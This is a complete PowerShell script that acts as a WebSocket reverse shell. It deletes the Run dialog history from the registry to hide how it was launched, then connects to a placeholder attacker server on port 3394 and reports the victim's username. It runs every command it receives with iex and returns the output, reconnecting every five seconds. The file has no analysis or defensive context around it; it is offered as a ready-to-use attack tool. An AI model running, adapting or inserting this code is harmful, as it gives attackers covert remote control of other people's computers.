reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /va /f;
[Console]::OutputEncoding = [System.Text.Encoding]::GetEncoding(850)
Try{
	$URL = 'ws://[your_server]:3394'
	
	function WaitForSocket {
		While (!$Conn.IsCompleted) { 
			Start-Sleep -Milliseconds 10
		}
	}
	function SendToSocket {
		param( [string]$cmd_send, [string]$data_send )
		
		$data_send_json = $data_send | ConvertTo-Json
$json_send = @"
{
"cmd": "$cmd_send",
"data": $data_send_json
}
"@		
					
		$Command = [System.Text.Encoding]::UTF8.GetBytes($json_send)
		$Send = New-Object System.ArraySegment[byte] -ArgumentList @(,$Command)            
		$Conn = $WS.SendAsync($Send, [System.Net.WebSockets.WebSocketMessageType]::Text, $true, $CT)
		WaitForSocket		
	}
	function SendInitialMessage
	{
		$PC_Name = "$env:UserName"
		SendToSocket -cmd_send "connect_shell" -data_send $PC_Name
	}
	function HandleRecv
	{
		$Recv = [Net.WebSockets.WebSocket]::CreateClientBuffer(1024,1024)
		$Conn = $WS.ReceiveAsync($Recv, $CT)
		WaitForSocket
		try {
			$cmd = [System.Text.Encoding]::utf8.GetString($Recv)
			$cmd = $cmd -replace '\0',''
			$cmdRet = iex $cmd | Out-String
			if($cmdRet.length -eq 0)
			{
				$cmdRet = "Success"
			}
			SendToSocket -cmd_send "cmd_response" -data_send $cmdRet
		}
		catch { 
			SendToSocket -cmd_send "cmd_response" -data_send $_
		}	
	}
	

    Do{	
        $WS = New-Object System.Net.WebSockets.ClientWebSocket                                                
        $CT = New-Object System.Threading.CancellationToken
        $WS.Options.UseDefaultCredentials = $true	
		Write-Host "Connecting to $url"
        $Conn = $WS.ConnectAsync($URL, $CT)
		WaitForSocket

		if($WS.State -eq 'Open')
		{
			Write-Host "Connected to $url"
			SendInitialMessage
	
			While ($WS.State -eq 'Open') {      
				HandleRecv
			}
		}
		
		Start-Sleep -Milliseconds 5000 
    } While ($true)

}Finally{
    If ($WS) { 
        Write-Host "Closing websocket"
        $WS.Dispose()
    }
}
